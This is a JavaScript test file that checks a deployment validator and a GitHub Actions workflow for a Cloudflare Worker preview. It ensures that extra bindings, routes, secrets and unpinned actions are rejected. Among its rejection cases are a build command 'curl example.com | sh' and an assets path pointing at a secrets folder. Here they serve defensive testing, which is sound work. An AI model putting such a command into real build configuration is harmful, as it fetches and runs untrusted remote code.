import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import test from "node:test";
import { PREVIEW_NAME, previewConfigProblems, rewriteForPreview } from "../.github/scripts/preview-437-validate.mjs";

const workflow = readFileSync(new URL("../.github/workflows/preview-437.yml", import.meta.url), "utf8").replace(/\r/g, "");

// The configuration the build generates for the pilot, as seen in dist/server/wrangler.json.
const generated = () => ({
  topLevelName: "lastrico", name: "lastrico", compatibility_date: "2026-05-15", compatibility_flags: ["nodejs_compat"],
  durable_objects: { bindings: [{ name: "ROUTE_ENGINE", class_name: "RouteEngine" }] },
  kv_namespaces: [], queues: { producers: [], consumers: [] }, r2_buckets: [], services: [], vars: {},
  d1_databases: [{ binding: "DB", database_name: "site-creator-d1", database_id: "11111111-2222-4333-8444-555555555555" }],
  legacy_env: true, main: "index.js", migrations: [{ tag: "v1-route-engine", new_sqlite_classes: ["RouteEngine"] }],
  rules: [{ type: "ESModule", globs: ["**/*.js"] }], build: { watch_dir: "./src" }, no_bundle: true, logfwdr: { bindings: [] },
  assets: { directory: "../client" }, observability: { enabled: true },
});

test("the preview configuration is accepted only after renaming and dropping D1", () => {
  assert.notDeepEqual(previewConfigProblems(generated()), []);
  assert.deepEqual(previewConfigProblems(rewriteForPreview(generated())), []);
});

test("every binding, route or resource beyond the preview's own RouteEngine is rejected", () => {
  const cases = {
    "D1": { d1_databases: [{ binding: "DB", database_id: "x" }] },
    "KV": { kv_namespaces: [{ binding: "K", id: "x" }] },
    "R2": { r2_buckets: [{ binding: "R", bucket_name: "x" }] },
    "service binding": { services: [{ binding: "S", service: "lastrico-pilot" }] },
    "queue producer": { queues: { producers: [{ binding: "Q", queue: "q" }], consumers: [] } },
    "route": { routes: [{ pattern: "lastrico.example/*", zone_name: "example" }] },
    "single route": { route: "lastrico.example/*" },
    "cron trigger": { triggers: { crons: ["* * * * *"] } },
    "variable": { vars: { TOKEN: "x" } },
    "environment": { env: { production: { name: "lastrico-pilot" } } },
    "AI binding": { ai: { binding: "AI" } },
    "Durable Object of another Worker": { durable_objects: { bindings: [{ name: "ROUTE_ENGINE", class_name: "RouteEngine", script_name: "lastrico-pilot" }] } },
    "extra Durable Object": { durable_objects: { bindings: [{ name: "ROUTE_ENGINE", class_name: "RouteEngine" }, { name: "X", class_name: "X" }] } },
    "build command": { build: { command: "curl example.com | sh" } },
    "assets elsewhere": { assets: { directory: "../../secrets" } },
    "pilot name": { name: "lastrico-pilot", topLevelName: "lastrico-pilot" },
  };
  for (const [label, change] of Object.entries(cases)) {
    assert.notDeepEqual(previewConfigProblems({ ...rewriteForPreview(generated()), ...change }), [], `${label} must be rejected`);
  }
});

test("workflow: manual only, commit fixed, no commit input", () => {
  assert.match(workflow, /^on:\n {2}workflow_dispatch:/m);
  assert.doesNotMatch(workflow, /\n {2}(push|pull_request|pull_request_target|schedule|workflow_run):/);
  assert.match(workflow, /APPROVED_SHA: 94650a2ea11dfc7a67b27e4ea0b3f635f75b7f50/);
  assert.doesNotMatch(workflow, /inputs\.commit/);
  assert.match(workflow, /rev-parse HEAD\)" = "\$APPROVED_SHA"/);
  assert.match(workflow, /^permissions: \{\}/m);
});

test("workflow: credentials appear only in the publish and delete steps, which run on main and never in the build job", () => {
  const sections = workflow.split(/\n {2}(?=(?:guard|build|deploy|delete):\n)/);
  const job = (name) => sections.find((section) => section.startsWith(`${name}:`)) ?? "";
  assert.doesNotMatch(job("guard"), /secrets\./);
  assert.doesNotMatch(job("build"), /secrets\./);
  assert.equal((workflow.match(/secrets\.CLOUDFLARE_API_TOKEN/g) ?? []).length, 2);
  for (const name of ["deploy", "delete"]) {
    assert.match(job(name), /if: inputs\.action == '(deploy|delete)' && github\.ref == 'refs\/heads\/main'/);
    assert.match(job(name), /permissions: \{\}/);
  }
  assert.doesNotMatch(job("delete"), /actions\/checkout/);
  assert.doesNotMatch(job("deploy"), /npm ci|npm test|prepare-milan-release/);
  for (const line of workflow.split("\n").filter((l) => /deploy:pilot/.test(l))) assert.match(line, /--dry-run/);
  for (const line of workflow.split("\n").filter((l) => /^\s+(- )?uses:/.test(l))) assert.match(line, /@[0-9a-f]{40}/, `unpinned action: ${line.trim()}`);
});

test("workflow: the delete action can only name the preview Worker", () => {
  assert.match(workflow, /PREVIEW_NAME: lastrico-preview-437/);
  assert.equal(PREVIEW_NAME, "lastrico-preview-437");
  const deletes = workflow.split("\n").filter((line) => /wrangler delete/.test(line));
  assert.ok(deletes.length >= 2);
  for (const line of deletes) assert.match(line, /wrangler delete "\$PREVIEW_NAME"/);
});
